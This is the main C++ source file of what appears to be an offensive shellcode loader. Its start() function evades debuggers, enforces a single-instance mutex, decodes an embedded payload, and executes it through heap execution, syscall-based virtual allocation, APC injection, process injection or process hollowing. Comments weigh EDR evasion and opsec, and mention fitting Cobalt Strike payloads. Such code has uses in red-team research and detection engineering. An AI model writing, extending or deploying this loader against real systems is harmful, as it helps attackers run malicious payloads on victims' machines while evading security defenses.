// start.cpp - main function that kicks everything off
// ___________
// \_   _____/ _____ ______   ___________  ___________ 
//  |    __)_ /     \\____ \_/ __ \_  __ \/  _ \_  __ \
//  |        \  Y Y  \  |_> >  ___/|  | \(  <_> )  | \/
// /_______  /__|_|  /   __/ \___  >__|   \____/|__|   
//         \/      \/|__|        \/                    
//

//                        ..::--:....                        
//                     .-#%%%%%%%%#*=:.......::-..           
//                  ..=#%%%%%@@@%%%%%%###***#***+=.          
//                 .-===##%%%%%%%#*+=--=+*--......           
//                .=+==+%%%%%%%%*-==*#%#:....                
//               .=-=+=#@@@@%%%%@@@%%%=.                     
//             .:==::==%%@%%%%%%%%%%%:.                      
//           .:+**=-::-=#%%%%%%%%%%*:.                       
//        ..-*****+=------=+##%%%#-...                       
//        .+****+++++==----===****=:..                       
//       .*#**+++++*+++++++++==-----=-..                     
//      .+#*+=+***####=-::--::::::::::..                     
//      :#*=+**####+:::::::::::::::::::..                    
//     .+*+***###+-:::::::::::::::...::..                    
//    .-*===*##*-:..::::::::::::....:::..                    
//    :#+=-=+#%*:...:::::::::..:::--:::..                    
//   .*+===++%*:::..::::::::...:::::::::..                   
//  .+*+++##*%-:::....::::::.......:::::..                   
//  :#+++*%#**:::.....:::::::::....::::-:.                   
// .+#*+*#%##-:::.....:::::::::::::::::-+.                   
// :*****#@#=:::.....::::::::::::::::::-#+                   
//.=*+***#%-:::.....:::::::::::::::::::-*%-                  
//.+*****#=-:::::...:::::::------:---:::-+%:                 


// Includes dependencies. 
#include "start.h"
// The runner.h holds the function prototypes for all shellcode runner functions
#include "runner.h"

// buf.h holds the encoded buffer, dictionary if applicable, and definition files
#include "buf.h"

// defs.h holds the global definitions, tells us what to compile and what to exclude
#include "defs.h"

// includes our helper functions, functions that are bonuses, and not critical to execution
#include "helper.h"

#include "decode.h"

#include <stdio.h>


// Our big function that does it all
DWORD start()
{

#ifdef DEBUG_CHECK
	// checks to see if we are running in a debugger.
	if (isDebugged())
		//decoy code placeholder
		return -1;

	// also will not allow us to continue execution if verbosity is on
#ifdef VERBOSE
	return -1;
#endif
#endif

#ifdef RUN_ONCE_MUTEX
	// if a mutex is currently active, meaning the program is already running, quits out
#ifdef ENCODE_DICT
	if (mutex_check((char*)decode(mutex_enc, dict, MUTEX_NAME_SIZE)))
		// exits gracefully
		return ERROR_SUCCESS;
#endif
#ifdef ENCODE_DELTA
	if (mutex_check((char*)decode((const char**)mutex_enc, NULL, MUTEX_NAME_SIZE)))
		// exits gracefully
		return ERROR_SUCCESS;
#endif
#endif

#ifdef RUN_HEAP
// allocates memory on the heap that is executable, writes our shellcode to it
// and then executes it. The pros of this is that heap allocation and writing
// is typically not caught by EDR, downsides is that it doesn't allocate via
// syscalls so this will be resolved by string searches or EDR could hook HeapAlloc
// in the future. However, heap allocation is very common (for example, c "malloc" command)
#ifdef ENCODE_DICT
	run_nomigrate_heap(buf, dict, DATA_SIZE);
#endif
#ifdef ENCODE_DELTA
	run_nomigrate_heap((const char**)buf, NULL, DATA_SIZE);
#endif
#endif

#ifdef RUN_VIRTUAL
// allocates virtual memory and then writes to it and executes our shellcode there.
// pros of this is that we use indirect randomized syscalls to do that, and that we can
// makes sure our memory permissions are not RWX. Downside is that this is the defacto
// way to load shellcode, so it's possible it could be behaviorally signatured in the future.
#ifdef ENCODE_DICT
	run_nomigrate_virtual(buf, dict, DATA_SIZE);
#endif
#ifdef ENCODE_DELTA
	run_nomigrate_virtual((const char**)buf, NULL, DATA_SIZE);
#endif
#endif

#ifdef RUN_APC
// for this we need our buffer and command line pointers and sizes, as well as the pointer to our dictionary for decoding.
// this creates a child process and injects into it via queuing a remote APC. using mapped memory. We map the memory into
// our own process and then copy that mapping into another process. I don't know how to make this work without using RWX,
// since the mapped memory permissions can't be changed with VirtualProtect (at least this implementation). But a good
// migration technique all the same. Probably the recommended over standard injection.
	
#ifdef ENCODE_DICT
	run_migrate_apc(buf, dict, DATA_SIZE, cmd, CMD_LINE_SIZE);
#endif

#ifdef ENCODE_DELTA
	run_migrate_apc((const char**)buf, NULL, DATA_SIZE, (const char**)cmd, CMD_LINE_SIZE);
#endif
#endif

#ifdef RUN_INJECT
// performs a basic process injection of a child process. does so using indirect randomized syscalls gathered from syswhispers3
// given that we're using syscalls for this, you will probably be as fine as you can be from an opsec perspective, however, 
// this is the defacto migration technique, so EDR has been better and better at detecting. definetely worth a try in your target
// environment. This also does not use RWX permissions so that is a plus.
#ifdef ENCODE_DICT
	run_migrate_inject(buf, dict, DATA_SIZE, cmd, CMD_LINE_SIZE);
#endif
#ifdef ENCODE_DELTA
	run_migrate_inject((const char**)buf, NULL, DATA_SIZE, (const char**)cmd, CMD_LINE_SIZE);
#endif
#endif

#ifdef RUN_HOLLOW
// performs shellcode execution via process hollowing. This is the stealthiest method to pivot here, however, there's a catch...
// you can only hollow into processes where there is space for you, the entry point to the end of the allocated memory for that
// process... with something like Cobalt Strike, which is pretty big, this isn't sustainable long term, it can already barely
// fit in anything. You could modify this by allocating more memory, but I feel like that kind of defeats the purpose. Your
// best bet is probably using this with smaller post ex shellcode or a stager.
#ifdef ENCODE_DICT
	run_migrate_hollow(buf, dict, DATA_SIZE, cmd, CMD_LINE_SIZE);
#endif
#ifdef ENCODE_DELTA
	run_migrate_hollow((const char**)buf, NULL, DATA_SIZE, (const char**)cmd, CMD_LINE_SIZE);
#endif
#endif

	return ERROR_SUCCESS;
}